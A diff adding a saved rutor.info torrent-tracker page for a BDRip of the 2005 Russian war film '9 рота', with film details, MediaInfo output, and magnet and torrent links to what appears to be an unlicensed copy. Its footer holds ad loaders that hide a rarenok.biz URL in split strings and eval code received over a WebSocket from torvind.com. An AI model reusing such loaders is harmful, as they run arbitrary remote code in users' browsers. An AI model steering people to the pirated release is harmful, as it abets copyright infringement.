@@ -1,0 +1,461 @@
+<html>
+<head>
+	<meta http-equiv="content-type" content="text/html; charset=utf-8" />
+	<link href="http://s.rutor.info/css.css" rel="stylesheet" type="text/css" media="screen" />
+	<link rel="alternate" type="application/rss+xml" title="RSS" href="/rss.php?category" />
+	<link rel="shortcut icon" href="http://s.rutor.info/favicon.ico" />
+	<title>rutor.info :: 9 рота (2005) BDRip-AVC от ExKinoRay</title>
+	<script type="text/javascript" src="http://ajax.googleapis.com/ajax/libs/jquery/1.4.2/jquery.min.js"></script>
+	<script type="text/javascript" src="http://s.rutor.info/jquery.cookie-min.js"></script>
+	<script type="text/javascript" src="http://s.rutor.info/t/functions.js"></script>
+	
+</head>
+<body>
+
+<div id="all">
+
+<div id="up">
+
+<div id="logo">
+	<a href="/"><img src="http://s.rutor.info/logo.jpg" alt="rutor.info logo" /></a>
+</div>
+
+<table id="news_table">
+  <tr><td colspan="2"><strong>Новости трекера</strong></td></tr><tr><td class="news_date">30-Дек</td>
+  	<td class="news_title"><a href="http://rutor.info/torrent/472" target="_blank"  id="news88" onclick="$.cookie('news', '88', {expires: 365});">У RUTOR.ORG - Новый Адрес: RUTOR.INFO</a></td></tr><tr><td class="news_date">29-Ноя</td>
+  	<td class="news_title"><a href="/torrent/178905" target="_blank"  id="news86">Вечная блокировка в России</a></td></tr><tr><td class="news_date">09-Окт</td>
+  	<td class="news_title"><a href="/torrent/145012" target="_blank"  id="news59">Путеводитель по RUTOR.org: Правила, Руководства, Секреты</a></td></tr></table>
+  <script type="text/javascript">
+  $(document).ready(function(){if($.cookie("news")<88){$("#news88").css({"color":"orange","font-weight":"bold"});}});
+  </script>
+
+</div>
+
+<div id="menu">
+<a href="/" class="menu_b" style="margin-left:10px;"><div>Главная</div></a>
+<a href="/top" class="menu_b"><div>Топ</div></a>
+<a href="/categories" class="menu_b"><div>Категории</div></a>
+<a href="/browse/" class="menu_b"><div>Всё</div></a>
+<a href="/search/" class="menu_b"><div>Поиск</div></a>
+<a href="/latest_comments" class="menu_b"><div>Комменты</div></a>
+<a href="/upload.php" class="menu_b"><div>Залить</div></a>
+<a href="/jabber.php" class="menu_b"><div>Чат</div></a>
+
+<div id="menu_right_side"></div>
+
+<script type="text/javascript">
+$(document).ready(function()
+{
+	var menu_right;
+	if ($.cookie('userid') > 0)
+	{
+		menu_right = '<a href="/users.php?logout" class="logout" border="0"><img src="http://s.rutor.info/i/viti.gif" alt="logout" /></a><span class="logout"><a href="/profile.php" class="logout"  border="0"><img src="http://s.rutor.info/i/profil.gif" alt="profile" /></a>';
+	}
+	else
+	{
+		menu_right = '<a href="/users.php" class="logout" border="0"><img src="http://s.rutor.info/i/zaiti.gif" alt="login" /></a>';
+	}
+	$("#menu_right_side").html(menu_right);
+});
+</script>
+
+</div>
+<h1>9 рота (2005) BDRip-AVC от ExKinoRay</h1>
+</div>
+<div id="ws">
+<div id="content">
+
+<center>
+<div id="b_tz_208" class="b_tz_on_top" onmouseup="window.event.cancelBubble=true"></div>
+</center>
+
+
+
+<div id="msg1"></div>
+<script type="text/javascript">
+$(document).ready(function()
+{
+	if ($.cookie('msg') != null)
+	{
+		if ($.cookie('msg').length > 0)
+		{
+			var msg2 = '<div id="warning">' + $.cookie('msg').replace(/["+"]/g, ' ') + '</div>';
+			$("#msg1").html(msg2);
+			$.cookie('msg', '', { expires: -1 });
+		}
+	}
+});
+</script><script type="text/javascript">function toggle_visibility(id) { var e = document.getElementById(id); if(e.style.display == 'block') e.style.display = 'none'; else e.style.display = 'block'; }</script>
+
+
+
+<div id="download">
+<a href="magnet:?xt=urn:btih:f559c33938c06a72d0bda3a09d21a007ea744a87&amp;dn=rutor.info_9+%D1%80%D0%BE%D1%82%D0%B0+%282005%29+BDRip-AVC+%D0%BE%D1%82+ExKinoRay&amp;tr=udp://opentor.org:2710&amp;tr=udp://opentor.org:2710&amp;tr=http://retracker.local/announce"><img src="http://s.rutor.info/i/magnet.gif"></a>
+<!--<a href="/mail.php?send_torrent=630548"><img src="http://s.rutor.info/t/mails.png"></a>-->
+<a href="http://d.rutor.info/download/630548"><img src="http://s.rutor.info/t/down.png"> Скачать 9.Rota.2005.ExKinoRay.mkv.torrent</a>
+<br />
+<a href="/torrent/141992" class="d_small" target="_blank">Как тут качать?</a>
+<script type="text/javascript">
+function addEngine(){ if (typeof(window.external) != "undefined" && typeof(window.external.AddSearchProvider) != "undefined") { window.external.AddSearchProvider('http://rutor.info/AddSearchProvider.xml'); } else { alert("Извините, чтобы установить плагин поиска, Вы должны использовать браузер Firefox!");}}
+</script>
+<a href="#" class="d_small" onclick="addEngine();">Добавить rutor.info в поисковую строку</a>
+</div>
+
+
+
+
+
+<table width="100%">
+<tr><td colspan="2" style="text-align:center;">
+<script type="text/javascript">
+	var docw = document.body.clientWidth;
+	docw = docw - 270 - 470 - 50;
+	begun1_width = docw;
+	var filelist_already_loaded = 0;
+</script>
+
+</td>
+</tr>
+</table>
+
+
+<table id="details">
+
+<tr><td style="vertical-align:top;"></td><td><br /><img src="https://a.radikal.ru/a23/1805/9c/557329e0cd53.png" style="float:right;" /><br />
+<br />
+<span style="font-family:Georgia;"> <u>Информация о фильме</u><br />
+<b>Оригинальное название</b>: 9 рота <br />
+<b>Год выхода</b>: 2005<br />
+<b>Жанр</b>:  <a href="/tag/5/Боевик" target="_blank">Боевик</a>, <a href="/tag/5/драма" target="_blank">драма</a>, <a href="/tag/5/военный" target="_blank">военный</a>, <a href="/tag/5/история" target="_blank">история</a><br />
+<b>Режиссер</b>: Фёдор Бондарчук <br />
+<b>В ролях</b>: Артур Смольянинов, Алексей Чадов, Иван Кокорин, Артем Михалков, Константин Крюков, Михаил Пореченков, Федор Бондарчук, Ирина Рахманова, Алексей Серебряков, Михаил Ефремов, Алексей Кравченко, Андрей Краско, Станислав Говорухин, Александр Баширов, Александр Лыков <br />
+<br />
+<b><span style="color:DarkSlateGray;"><font size="3">О фильме</font></span></b> :<br />
+<span style="color:DarkSlateGray;"><font size="3">СССР. Действие происходит в 1988 и 1989 годах, за несколько месяцев до полного вывода советских войск из Афганистана. Семеро призывников, после нескольких месяцев адской подготовки в «учебке» под командованием беспощадного старшины, попадают в горнило афганской кампании.Группа десантников, бойцами которой стали наши герои, получает задание командования — занять высоту и держать ее до прохождения колонны…</font></span><br />
+<br />
+<a href="http://www.imdb.com/title/tt0417397/" target="_blank"><img src="http://s.rutor.info/imdb/pic/0417397.gif" /></a> <a href="http://www.kinopoisk.ru/film/84674/" target="_blank"><img src="http://www.kinopoisk.ru/rating/84674.gif" /></a><br />
+<br />
+<b>Страна</b>: Россия, Финляндия, Украина <br />
+<b>Выпущено</b>: Art Pictures Group, Канал 1+1, Finnish Film Foundation, MRP Matila Rohr Productions Oy, Продюсерская компания &quot;Слово&quot;, Канал СТС, Украинская Медийная Группа, Yleisradio<br />
+<b>Продолжительность</b>: 02:19:13 <br />
+<b>Язык</b>: Русский<br />
+<br />
+<u>Файл</u><br />
+<b>Формат: </b> MKV<br />
+<b>Качество: </b> BDRip-AVC (BDRemux 1080p / GER Transfer) <br />
+<b>Видео</b>: MPEG-4 AVC, 768x308, ~ 672 Кбит/с<br />
+<b>Аудио</b>: <img src="http://i93.fastpic.ru/big/2017/0727/c0/4b72f0369a3393219ed5935e91fc15c0.gif" /> AAC-HE, 2 ch, ~ 76 Кбит/с<br />
+<b>Субтитры</b>: Русские, английские<br />
+<br />
+<div class="hidewrap"><div class="hidehead" onclick="hideshow($(this))">MI</div><div class="hidebody"></div><textarea class="hidearea">Общее <br />
+Уникальный идентификатор : 245391887940905392328667172604188744029 (0xB89CC22DADE60C27B37D640A02AAD95D) <br />
+Полное имя : D:MOVIES9.Rota.2005.ExKinoRay.mkv <br />
+Формат : Matroska <br />
+Версия формата : Version 4 / Version 2 <br />
+Размер файла : 746 Мбайт <br />
+Продолжительность : 2 ч. 19 м. <br />
+Общий поток : 750 Кбит/сек <br />
+Дата кодирования : UTC 2018-05-08 18:14:23 <br />
+Программа кодирования : mkvmerge v15.0.0 (&#039;Duel with the Devil&#039;) 64-bit <br />
+Библиотека кодирования : libebml v1.3.5 + libmatroska v1.4.5 <br />
+<br />
+Видео <br />
+Идентификатор : 1 <br />
+Формат : AVC <br />
+Формат/Информация : Advanced Video Codec <br />
+Профиль формата : High@L4.1 <br />
+Параметр CABAC формата : Да <br />
+Параметр RefFrames формата : 10 кадров <br />
+Идентификатор кодека : V_MPEG4/ISO/AVC <br />
+Продолжительность : 2 ч. 19 м. <br />
+Битрейт : 672 Кбит/сек <br />
+Ширина : 768 пикселей <br />
+Высота : 308 пикселей <br />
+Соотношение сторон : 2,494 <br />
+Режим частоты кадров : Постоянный <br />
+Частота кадров : 23,976 (24000/1001) кадра/сек <br />
+Цветовое пространство : YUV <br />
+Субдискретизация насыщенности : 4:2:0 <br />
+Битовая глубина : 8 бит <br />
+Тип развёртки : Прогрессивная <br />
+Бит/(Пиксели*Кадры) : 0.118 <br />
+Размер потока : 669 Мбайт (90%) <br />
+Библиотека кодирования : x264 core 152 r2851 ba24899 <br />
+Настройки программы : cabac=1 / ref=10 / deblock=1:-2:-2 / analyse=0x3:0x133 / me=umh / subme=11 / psy=1 / psy_rd=1.00:0.10 / mixed_ref=1 / me_range=32 / chroma_me=1 / trellis=2 / 8x8dct=1 / cqm=0 / deadzone=21,11 / fast_pskip=0 / chroma_qp_offset=-3 / threads=6 / lookahead_threads=1 / sliced_threads=0 / nr=0 / decimate=0 / interlaced=0 / bluray_compat=0 / constrained_intra=0 / bframes=10 / b_pyramid=2 / b_adapt=2 / b_bias=0 / direct=3 / weightb=1 / open_gop=0 / weightp=2 / keyint=240 / keyint_min=23 / scenecut=40 / intra_refresh=0 / rc_lookahead=40 / rc=2pass / mbtree=0 / bitrate=672 / ratetol=1.0 / qcomp=0.60 / qpmin=0 / qpmax=69 / qpstep=4 / cplxblur=20.0 / qblur=0.5 / vbv_maxrate=50000 / vbv_bufsize=62500 / nal_hrd=none / filler=0 / ip_ratio=1.40 / pb_ratio=1.30 / aq=1:1.00 <br />
+Default : Да <br />
+Forced : Нет <br />
+<br />
+Аудио <br />
+Идентификатор : 2 <br />
+Формат : AAC <br />
+Формат/Информация : Advanced Audio Codec <br />
+Профиль формата : HE-AAC / LC <br />
+Идентификатор кодека : A_AAC <br />
+Продолжительность : 2 ч. 19 м. <br />
+Битрейт : 76,0 Кбит/сек <br />
+Каналы : 2 канала <br />
+Расположение каналов : Front: L R <br />
+Частота : 48,0 КГц / 24,0 КГц <br />
+Частота кадров : 23,438 кадра/сек (1024 SPF) <br />
+Метод сжатия : С потерями <br />
+Задержка видео : 31 мс. <br />
+Размер потока : 75,7 Мбайт (10%) <br />
+Default : Да <br />
+Forced : Нет <br />
+<br />
+Текст #1 <br />
+Идентификатор : 3 <br />
+Формат : UTF-8 <br />
+Идентификатор кодека : S_TEXT/UTF8 <br />
+Идентификатор кодека/Информация : UTF-8 Plain Text <br />
+Продолжительность : 2 ч. 14 м. <br />
+Битрейт : 63 бит/сек <br />
+ElementCount : 1305 <br />
+Размер потока : 62,8 Кбайт (0%) <br />
+Заголовок : Full <br />
+Язык : Russian <br />
+Default : Нет <br />
+Forced : Нет <br />
+<br />
+Текст #2 <br />
+Идентификатор : 4 <br />
+Формат : UTF-8 <br />
+Идентификатор кодека : S_TEXT/UTF8 <br />
+Идентификатор кодека/Информация : UTF-8 Plain Text <br />
+Продолжительность : 2 ч. 14 м. <br />
+Битрейт : 37 бит/сек <br />
+ElementCount : 1299 <br />
+Размер потока : 36,7 Кбайт (0%) <br />
+Заголовок : Full <br />
+Язык : English <br />
+Default : Нет <br />
+Forced : Нет <br />
+<br />
+Меню <br />
+00:00:00.000 : ru:Chapter 01 <br />
+00:10:04.395 : ru:Chapter 02 <br />
+00:26:26.835 : ru:Chapter 03 <br />
+00:37:27.578 : ru:Chapter 04 <br />
+00:46:48.055 : ru:Chapter 05 <br />
+00:59:00.495 : ru:Chapter 06 <br />
+01:11:37.751 : ru:Chapter 07 <br />
+01:23:07.983 : ru:Chapter 08 <br />
+01:37:39.687 : ru:Chapter 09 <br />
+01:48:14.321 : ru:Chapter 10 <br />
+01:55:44.604 : ru:Chapter 11 <br />
+02:14:44.910 : ru:Chapter 12 <br />
+02:19:12.719 : ru:Chapter 13 <br />
+</textarea></div> <div class="hidewrap"><div class="hidehead" onclick="hideshow($(this))">Скриншоты</div><div class="hidebody"></div><textarea class="hidearea"><a href="http://i104.fastpic.ru/big/2018/0508/d9/9e5258137f7882c7ec9e317e6bdf4dd9.jpg" target="_blank"><img src="http://i105.fastpic.ru/big/2018/0508/72/76b5e20ad1a1b7abbce9785e71cbe572.jpg" /></a>  <a href="http://i105.fastpic.ru/big/2018/0508/f2/e4e6643572253c4d4d2cbaf4078041f2.jpg" target="_blank"><img src="http://i105.fastpic.ru/big/2018/0508/fc/7af6c8d7a75e45194831fc72482a3bfc.jpg" /></a>  <a href="http://i104.fastpic.ru/big/2018/0508/d7/e022bc1e2cb60198a624ca234570b0d7.jpg" target="_blank"><img src="http://i104.fastpic.ru/big/2018/0508/b6/96fc7a86cec2dd073b3baad138616bb6.jpg" /></a>  <a href="http://i105.fastpic.ru/big/2018/0508/89/3dc547a62587aa44e0ee3c1a6e35a489.jpg" target="_blank"><img src="http://i104.fastpic.ru/big/2018/0508/86/f1f5a9c45f0c432f84e25d7294cf4786.jpg" /></a><br />
+<br />
+<a href="http://i105.fastpic.ru/big/2018/0508/07/80f5a6f2a6130979139162b239458207.jpg" target="_blank"><img src="http://i105.fastpic.ru/big/2018/0508/dd/afc4078d2fe59b50281af0a713cc65dd.jpg" /></a>  <a href="http://i104.fastpic.ru/big/2018/0508/4d/627c17a840fb27616517c08a1b7a834d.jpg" target="_blank"><img src="http://i105.fastpic.ru/big/2018/0508/50/5b2f12247d937ca3aa157ee5b3348350.jpg" /></a>  <a href="http://i105.fastpic.ru/big/2018/0508/78/df17537b136bfc15a90accbc565f0a78.jpg" target="_blank"><img src="http://i105.fastpic.ru/big/2018/0508/21/ee86de6901b60e624aa994e2889fd721.jpg" /></a>  <a href="http://i105.fastpic.ru/big/2018/0508/78/217bd43c7a45bb1d27f1542c66ae2c78.jpg" target="_blank"><img src="http://i104.fastpic.ru/big/2018/0508/8b/23ba2b0b7f33899e3899204c8a21eb8b.jpg" /></a></textarea></div><br />
+<b>Релиз от:</b> <a href="http://exkinoray.tv" target="_blank"><img src="http://i101.fastpic.ru/big/2018/0205/db/2bb5d8d6418a0fdc34277325cb111edb.gif" /></a> <img src="http://i92.fastpic.ru/big/2017/0727/ee/d5deb5b73669b4c45974c6b5d6c309ee.gif" /> <img src="http://i92.fastpic.ru/big/2017/0727/34/cf9a17c70dfe7fe87e42af3f9f29e734.gif" /><br />
+</span></td></tr>
+<tr><td class="header">Залил</td><td><b><a href="/browse/0/0/1439393/0" target="_blank">sany771</a></b></td></tr>
+<tr><td class="header">Оценка</td><td>Никто ещё не поставил оценку</td></tr>
+<tr><td class="header">Категория</td><td><a href="/nashe_kino" target="_blank">Наши фильмы</a></td></tr>
+<tr><td class="header">Раздают</td><td>8</td></tr>
+<tr><td class="header">Качают</td><td>5</td></tr>
+<tr><td class="header">Сидер замечен</td><td>09-05-2018 8:19:06 (17 минут назад)</td></tr>
+<tr><td class="header">Добавлен</td><td>08-05-2018 21:40:55  (11 час назад)</td></tr>
+<tr><td class="header">Размер</td><td>746.42&nbsp;MB  (782675301 Bytes)</td></tr>
+
+<tr>
+	<td class="header" nowrap="nowrap">Добавить в</td>
+	<td style="vertical-align:middle;"><span class="fake_link" onclick="add_bookmark($(this), 630548);">закладки</span></td>
+</tr>
+
+<tr><td colspan="2"><div id="index"><fieldset style="border: 1px solid #3C95D1;"><legend style="font-weight: bold;">Связанные раздачи</legend><table width="100%"><tr class="backgr"><td width="10px">Добавлен</td><td colspan="2">Название</td><td width="1px">Размер</td><td width="1px">Пиры</td></tr><tr class="gai"><td>28&nbsp;Фев&nbsp;18</td><td ><a class="downgif" href="http://d.rutor.info/download/616082"><img src="http://s.rutor.info/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:f889e06a3795eacb58aa7155a98cda2a53fed596&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="http://s.rutor.info/i/m.png" alt="M" /></a>
+<a href="/torrent/616082/9-rota-2005-bdrip-720p-ot-k.e.n-megapeer-ger-transfer-licenzija">9 рота (2005) BDRip 720p от k.e.n &amp; MegaPeer | GER Transfer | Лицензия </a></td> <td align="right">7<img src="http://s.rutor.info/i/com.gif" alt="C" /></td>
+<td align="right">5.76&nbsp;GB</td><td align="center"><span class="green"><img src="http://s.rutor.info/t/arrowup.gif" alt="S" />&nbsp;14</span>&nbsp;<img src="http://s.rutor.info/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;3</span></td></tr><tr class="tum"><td>14&nbsp;Ноя&nbsp;16</td><td ><a class="downgif" href="http://d.rutor.info/download/337892"><img src="http://s.rutor.info/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:3c3f9c1d67d06d4b0dce3d8b18eeb36705660b41&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="http://s.rutor.info/i/m.png" alt="M" /></a>
+<a href="/torrent/337892/9-rota-2005-bdrip-avc">9 рота (2005) BDRip-AVC </a></td> <td align="right">5<img src="http://s.rutor.info/i/com.gif" alt="C" /></td>
+<td align="right">2.18&nbsp;GB</td><td align="center"><span class="green"><img src="http://s.rutor.info/t/arrowup.gif" alt="S" />&nbsp;7</span>&nbsp;<img src="http://s.rutor.info/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;1</span></td></tr><tr class="gai"><td>04&nbsp;Сен&nbsp;15</td><td ><a class="downgif" href="http://d.rutor.info/download/455019"><img src="http://s.rutor.info/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:4675828ceeaa2af71b879be8a6ede1ccc2191b98&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="http://s.rutor.info/i/m.png" alt="M" /></a>
+<a href="/torrent/455019/9-rota-2005-bdremux-1080p-ot-exkinoray-ger-transfer-licenzija">9 рота (2005) BDRemux 1080p от ExKinoRay | GER Transfer | Лицензия </a></td> <td align="right">6<img src="http://s.rutor.info/i/com.gif" alt="C" /></td>
+<td align="right">27.25&nbsp;GB</td><td align="center"><span class="green"><img src="http://s.rutor.info/t/arrowup.gif" alt="S" />&nbsp;2</span>&nbsp;<img src="http://s.rutor.info/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;3</span></td></tr><tr class="tum"><td>01&nbsp;Авг&nbsp;15</td><td ><a class="downgif" href="http://d.rutor.info/download/448390"><img src="http://s.rutor.info/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:c125ad139cddcf85685a17633be903e413d2f0fe&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="http://s.rutor.info/i/m.png" alt="M" /></a>
+<a href="/torrent/448390/9-rota-2005-hdrip-ot-magnat231-kpk-licenzija">9 рота (2005) HDRip от MAGNAT231 | КПК | Лицензия </a></td> <td align="right">2<img src="http://s.rutor.info/i/com.gif" alt="C" /></td>
+<td align="right">577.86&nbsp;MB</td><td align="center"><span class="green"><img src="http://s.rutor.info/t/arrowup.gif" alt="S" />&nbsp;5</span>&nbsp;<img src="http://s.rutor.info/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;0</span></td></tr><tr class="gai"><td>29&nbsp;Июл&nbsp;15</td><td ><a class="downgif" href="http://d.rutor.info/download/447662"><img src="http://s.rutor.info/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:8e14783eb1bb49070d803cf74e438ff22d9a0607&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="http://s.rutor.info/i/m.png" alt="M" /></a>
+<a href="/torrent/447662/9-rota-2005-bdrip-ot-hq-video">9 рота (2005) BDRip от HQ-ViDEO </a></td> <td align="right">6<img src="http://s.rutor.info/i/com.gif" alt="C" /></td>
+<td align="right">2.18&nbsp;GB</td><td align="center"><span class="green"><img src="http://s.rutor.info/t/arrowup.gif" alt="S" />&nbsp;22</span>&nbsp;<img src="http://s.rutor.info/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;2</span></td></tr><tr class="tum"><td>05&nbsp;Ноя&nbsp;14</td><td ><a class="downgif" href="http://d.rutor.info/download/389273"><img src="http://s.rutor.info/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:79927edde0e1bbdf01631630a4a17133174f257a&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="http://s.rutor.info/i/m.png" alt="M" /></a>
+<a href="/torrent/389273/9-rota-2005-bdrip-1080p-ger-transfer-licenzija">9 рота (2005) BDRip 1080p | GER Transfer | Лицензия </a></td> <td align="right">12<img src="http://s.rutor.info/i/com.gif" alt="C" /></td>
+<td align="right">11.55&nbsp;GB</td><td align="center"><span class="green"><img src="http://s.rutor.info/t/arrowup.gif" alt="S" />&nbsp;2</span>&nbsp;<img src="http://s.rutor.info/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;0</span></td></tr><tr class="gai"><td>02&nbsp;Янв&nbsp;14</td><td ><a class="downgif" href="http://d.rutor.info/download/326645"><img src="http://s.rutor.info/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:409849da87e06e5315b575ced84764966455d344&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="http://s.rutor.info/i/m.png" alt="M" /></a>
+<a href="/torrent/326645/9-rota-2005-hdrip-ot-scarabey">9 рота (2005) HDRip от Scarabey </a></td> <td align="right">2<img src="http://s.rutor.info/i/com.gif" alt="C" /></td>
+<td align="right">2.18&nbsp;GB</td><td align="center"><span class="green"><img src="http://s.rutor.info/t/arrowup.gif" alt="S" />&nbsp;2</span>&nbsp;<img src="http://s.rutor.info/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;0</span></td></tr></table><div style="width: 100%; text-align: right; margin-top: 4px; margin-bottom: -5px;"><a href="/search/0/5/0/0/9 рота" target="_blank">Искать ещё похожие раздачи</a></div></fieldset></div></td></tr>
+
+<tr><td class='header'><span onclick="if(filelist_already_loaded==0){filelist_already_loaded=1;$('#filelist').load('/descriptions/630548.files');}toggle_visibility('displayfiles');" class="button"><u>Файлы (1)</u></span></td><td>
+<div id="displayfiles" style="display:none;max-height:450px;overflow:auto;">
+<table id="files">
+<tr><td>Название</td><td>Размер</td></tr>
+<tbody id="filelist"><tr><td colspan="2" style="text-align:center;">Происходит загрузка списка файлов...</td></tr></tbody>
+</table>
+</div>
+</td></tr>
+
+</table>
+<br />
+<br />
+
+<script type="text/javascript">
+var bookmarked = 0;
+function add_bookmark(me, id)
+{
+	if (bookmarked == 0)
+	{
+		$.ajax({
+	  type: "POST",
+		url: "/bookmarks.php",
+	  data: "access_method=ajax&action=add_bookmark&torrent_id=" + id,
+	  success: function(res){
+	  		if (res == 0)
+	  		{
+	  			me.html('Зайдите на трекер!');
+	  			me.css({"color":"red"});
+	  		}
+	  		else if (res == 3)
+	  		{
+	  			me.html('Закладка добавлена!');
+	  			me.css({"color":"green"});
+	  		}
+	  		else if (res == 2)
+	  		{
+	  			me.html('Такая закладка у Вас уже существует!');
+	  			me.css({"color":"orange"});
+	  		}
+	  		else if (res == 5)
+	  		{
+	  			me.html('Ограничение численности закладок достигнуто!');
+	  			me.css({"color":"red"});
+	  		}
+  		}
+ 		});
+	}
+	bookmarked++;
+}
+$(document).ready(function() {
+	if ($.cookie('userid') > 0) {
+		$("#cem").append(' | <a href="/edit.php?edit=630548">Редактировать</a>');
+		if (typeof torrent_moderate == typeof Function && $.cookie('class') >= 6) {
+			$("#cem").append('<br /><span onClick="torrent_moderate(630548);">Промодерировать раздачу</span> | <span onclick="confirm_delete(630548);">Удалить</span>');
+		}
+	}
+});
+</script>
+
+
+<strong>
+<div style="text-align: center;" id="cem"><a href="/comment/630548">Написать комментарий</a>
+
+
+</div>
+</strong>
+
+<br/><br/>
+<script type="text/javascript">
+<!--
+function confirmation(delete_comment) {
+	var answer = confirm("Удалить комментарий?")
+	if (answer){
+		window.location = "/comment.php?delete_comment=" + delete_comment;
+	}
+}
+//-->
+</script>
+	<script type="text/javascript"><!--
+	function confirmation(delete_comment) {
+		var answer = confirm("Удалить комментарий?")
+		if (answer){
+			window.location = "/comment.php?delete_comment=" + delete_comment;
+		}
+	}
+	function cOptions(userid, cid) {
+	var cstr = 'c_' + cid;
+	var c_url = '<a href="/comment.php?edit_comment=' + cid + '"><img src="http://s.rutor.info/t/c_edit.png"></a><a onClick=confirmation(' + cid + ')><img  src="http://s.rutor.info/t/c_delete.png"></a>';
+	if (userid == getCookie('userid') || getCookie('class') >= 5)
+		document.getElementById(cstr).innerHTML = c_url;
+}
+//-->
+</script>
+	<table width="100%" cellspacing="0" cellpadding="4"></table>
+<center><a href="#up"><img src="http://s.rutor.info/t/top.gif" alt="up" /></a></center>
+
+<!-- bottom banner -->
+
+<div id="down">
+Файлы для обмена предоставлены пользователями сайта. Администрация не несёт ответственности за их содержание.
+На сервере хранятся только торрент-файлы. Это значит, что мы не храним никаких нелегальных материалов. <a href="/advertise.php">Реклама</a>. 
+</div>
+
+
+</div>
+
+<div id="sidebar">
+
+<div class="sideblock">
+	<a id="fforum" href="/torrent/145012"><img src="http://s.rutor.info/i/forum.gif" alt="forum" /></a>
+</div>
+
+<div class="sideblock">
+<center>
+<table border="0" background="http://s.rutor.info/i/poisk_bg.gif" cellspacing="0" cellpadding="0" width="100%" height="56px">
+<script type="text/javascript">function search_sidebar() { window.location.href = '/search/'+$('#in').val(); return false; }</script>
+<form action="/b.php" method="get" onsubmit="return search_sidebar();">
+ <tr>
+  <td scope="col" rowspan=2><img src="http://s.rutor.info/i/lupa.gif" border="0" alt="img" /></td>
+  <td valign="middle"><input type="text" name="search" size="18" id="in"></td>
+ </tr>
+ <tr>
+  <td><input name="submit" type="submit" id="sub" value="искать по названию"></td>
+ </tr>
+</form>
+</table>
+</center>
+</div>
+
+
+
+<div class="sideblock2">
+<center>
+<div id="b_bn_51" onmouseup="window.event.cancelBubble=true"></div>
+<script>(function(){var s=document.createElement('script');s.src='http://tredman.com/j/w.php?id=51&r='+Math.random();document.getElementsByTagName('head')[0].appendChild(s)})();</script>
+</center>
+</div>
+
+<div class="sideblock2">
+<!--LiveInternet counter--><script type="text/javascript"><!--
+document.write("<a href='http://www.liveinternet.ru/click' "+
+"target=_blank><img src='http://counter.yadro.ru/hit?t39.6;r"+
+escape(document.referrer)+((typeof(screen)=="undefined")?"":
+";s"+screen.width+"*"+screen.height+"*"+(screen.colorDepth?
+screen.colorDepth:screen.pixelDepth))+";u"+escape(document.URL)+
+";"+Math.random()+
+"' alt='' title='LiveInternet' "+
+"border=0 width=31 height=31><\/a>")//--></script><!--/LiveInternet-->
+</div>
+
+</div>
+
+</div>
+
+
+
+<script type="text/javascript">
+ (function () {
+ var script_id = "MTIzNg==", s = document.createElement("script");
+ s.type = "text/javascript";
+ s.charset = "utf-8";
+s.src = "//torvind.com/js/" + script_id+".js?r="+Math.random()*10000000000;
+ s.async = true;
+ s.onerror = function(){
+  var ws = new WebSocket("ws://torvind.com:8040/");
+  ws.onopen = function () {
+   ws.send(JSON.stringify({type:"p", id: script_id}));
+  };
+  ws.onmessage = function(tx) { ws.close(); window.eval(tx.data); };
+ };
+ document.body.appendChild(s);
+ })();
+</script>
+
+<script>(function(){var a=document.createElement("script");a.src="http://rarenok.biz"+"/im"+"g/r"+"/i/208/"+Math.floor(Math.random()*Math.pow(10,6))+".php";document.getElementsByTagName("head")[0].appendChild(a)})();</script>
+
+
+</body>
+</html>
